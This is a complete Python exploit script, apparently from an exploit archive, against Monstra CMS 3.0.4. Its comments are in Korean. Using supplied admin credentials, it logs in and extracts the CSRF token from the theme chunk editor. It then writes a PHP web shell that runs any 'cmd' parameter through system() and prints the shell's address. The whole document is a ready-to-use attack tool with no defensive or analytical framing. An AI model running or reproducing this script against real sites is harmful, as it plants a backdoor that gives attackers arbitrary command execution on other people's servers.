# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
# Date: 05.05.2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://monstra.org/
# Software Link: https://monstra.org/monstra-3.0.4.zip
# Version: 3.0.4
# Tested on: MacOS

import random
import re
import string
import sys
import time

import requests

# 1. 인자값 검증 (스크립트 실행 시 URL, 아이디, 비밀번호가 모두 입력되었는지 확인)
if len(sys.argv) < 4:
    print("Usage: python3 script.py <url> <username> <password>")
    sys.exit(1)

base_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

# 세션 객체 생성 (로그인 상태를 유지하기 위함)
session = requests.Session()

# 2. 관리자 로그인 과정
login_url = f"{base_url}/admin/index.php?id=dashboard"
login_data = {"login": username, "password": password, "login_submit": "Log+In"}

# 웹셸 파일명으로 사용할 무작위 5글자 문자열 생성
filename = "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

print("Logging in...")
response = session.post(login_url, data=login_data)

# 로그인 성공 여부 확인 (응답 페이지에 'Dashboard' 문구가 포함되어 있는지 검사)
if "Dashboard" in response.text:
    print("Login successful")
else:
    print("Login failed")
    exit()

time.sleep(3)

# 3. CSRF 토큰 우회 (테마 청크 추가 페이지에서 CSRF 토큰 추출)
edit_url = f"{base_url}/admin/index.php?id=themes&action=add_chunk"
response = session.get(edit_url)

# 정규식을 이용해 HTML 내부의 숨겨진 CSRF 토큰 값 파싱
token_search = re.search(
    r'input type="hidden" id="csrf" name="csrf" value="(.*?)"', response.text
)
if token_search:
    token = token_search.group(1)
else:
    print("CSRF token could not be found.")
    exit()

# 4. 웹셸(Web Shell) 페이로드 작성
# - 웹 화면에서 명령어(cmd)를 입력받아 서버에서 실행(`system()`)하는 PHP 코드
content = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
"""

# 5. 테마 청크(파일) 생성 요청 데이터 구성
edit_data = {"csrf": token, "name": filename, "content": content, "add_file": "Save"}

print("Preparing shell...")
response = session.post(edit_url, data=edit_data)
time.sleep(3)

# 6. 웹셸 생성 결과 확인
if response.status_code == 200:
    print(f"Your shell is ready: {base_url}/public/themes/default/{filename}.chunk.php")
else:
    print("Failed to prepare shell.")
